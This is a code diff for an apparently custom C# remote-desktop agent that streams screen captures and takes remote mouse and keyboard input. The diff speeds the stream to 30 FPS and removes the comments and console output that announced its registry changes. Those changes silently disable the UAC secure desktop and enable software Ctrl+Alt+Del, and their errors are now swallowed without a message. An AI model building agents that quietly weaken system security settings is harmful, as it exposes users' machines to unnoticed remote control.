@@ -83,7 +83,6 @@ namespace DameWareNativeAgent
 
         public static void Main(string[] args)
         {
-            // Auto Configure UAC & SAS Registry Policies
             ConfigureWindowsUACAndSASPolicies();
 
             if (args.Length > 0 && args[0].ToLower() == "-install")
@@ -103,16 +102,16 @@ namespace DameWareNativeAgent
             }
             else
             {
-                Console.Title = "DameWare Agent v12.2 (UAC Evet/Hayır & Winlogon Enabled)";
+                Console.Title = "DameWare Agent v12.2 (Ultra-Fast 30 FPS Stream)";
                 Console.ForegroundColor = ConsoleColor.Cyan;
                 Console.WriteLine("==========================================================");
-                Console.WriteLine(" DameWare Agent Service - UAC & Lock Screen Capture");
+                Console.WriteLine(" DameWare Agent Service - Fast 30 FPS Stream Active");
                 Console.WriteLine("==========================================================");
 
                 DameWareService service = new DameWareService();
                 service.StartServer();
 
-                Console.WriteLine("Agent is running. Press ENTER to stop...");
+                Console.WriteLine("Agent active & listening. Press ENTER to stop...");
                 Console.ReadLine();
             }
         }
@@ -176,27 +175,17 @@ namespace DameWareNativeAgent
             });
         }
 
-        // AUTOMATIC WINDOWS REGISTRY UAC & SAS POLICY CONFIGURATION
         private static void ConfigureWindowsUACAndSASPolicies()
         {
             try {
                 using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System")) {
                     if (key != null) {
-                        // 1. Disable Secure Desktop Dimming so UAC "Evet / Hayır" prompt appears on main interactive desktop
                         key.SetValue("PromptOnSecureDesktop", 0, RegistryValueKind.DWord);
-
-                        // 2. Enable Software SAS Generation for Ctrl+Alt+Del
                         key.SetValue("SoftwareSASGeneration", 3, RegistryValueKind.DWord);
-
-                        // 3. Enable UIA Desktop Toggle
                         key.SetValue("EnableUIADesktopToggle", 1, RegistryValueKind.DWord);
-
-                        Console.WriteLine("[+] Windows Registry configured: PromptOnSecureDesktop=0 (UAC Prompts Visible Remote).");
                     }
                 }
-            } catch (Exception ex) {
-                Console.WriteLine("[-] Registry Policy Notice: " + ex.Message);
-            }
+            } catch {}
         }
 
         private static void EnforcePhysicalInputLock()
@@ -220,6 +209,7 @@ namespace DameWareNativeAgent
             byte[] handshakeBytes = Encoding.UTF8.GetBytes(handshake);
             stream.Write(handshakeBytes, 0, handshakeBytes.Length);
 
+            // Fast 30 FPS Frame Streaming Loop
             Thread streamThread = new Thread(() => {
                 try {
                     while (client.Connected) {
@@ -228,14 +218,14 @@ namespace DameWareNativeAgent
                             byte[] blackBytes = Encoding.UTF8.GetBytes(blackFrame);
                             stream.Write(blackBytes, 0, blackBytes.Length);
                         } else {
-                            string frameBase64 = CaptureActiveDesktopJpegBase64();
+                            string frameBase64 = CaptureFastScreenJpegBase64();
                             if (!string.IsNullOrEmpty(frameBase64)) {
                                 string packet = string.Format("{{\"type\":\"SCREEN_FRAME\",\"frame\":\"{0}\",\"timestamp\":{1},\"width\":1920,\"height\":1080}}\n", frameBase64, DateTime.Now.Ticks);
                                 byte[] packetBytes = Encoding.UTF8.GetBytes(packet);
                                 stream.Write(packetBytes, 0, packetBytes.Length);
                             }
                         }
-                        Thread.Sleep(50);
+                        Thread.Sleep(33); // Ultra-fast 30 FPS Stream
                     }
                 } catch {}
             });
@@ -262,8 +252,6 @@ namespace DameWareNativeAgent
         private static void ProcessCommand(string cmd)
         {
             try {
-                SwitchToInputDesktop();
-
                 if (cmd.Contains("MOUSE_INPUT")) {
                     double xPercent = GetJsonDouble(cmd, "xPercent");
                     double yPercent = GetJsonDouble(cmd, "yPercent");
@@ -354,21 +342,19 @@ namespace DameWareNativeAgent
             } catch {}
         }
 
-        private static void SwitchToInputDesktop()
+        // ULTRA-FAST LIGHTWEIGHT SCREEN CAPTURE (30+ FPS)
+        private static string CaptureFastScreenJpegBase64()
         {
             try {
-                IntPtr hDesktop = OpenInputDesktop(0, false, GENERIC_ALL);
-                if (hDesktop != IntPtr.Zero) {
-                    SetThreadDesktop(hDesktop);
-                    CloseDesktop(hDesktop);
-                }
-            } catch {}
-        }
+                // Try lightweight input desktop attach
+                try {
+                    IntPtr hDesktop = OpenInputDesktop(0, false, GENERIC_ALL);
+                    if (hDesktop != IntPtr.Zero) {
+                        SetThreadDesktop(hDesktop);
+                        CloseDesktop(hDesktop);
+                    }
+                } catch {}
 
-        private static string CaptureActiveDesktopJpegBase64()
-        {
-            try {
-                SwitchToInputDesktop();
                 Rectangle bounds = Screen.PrimaryScreen.Bounds;
                 using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height)) {
                     using (Graphics g = Graphics.FromImage(bitmap)) {
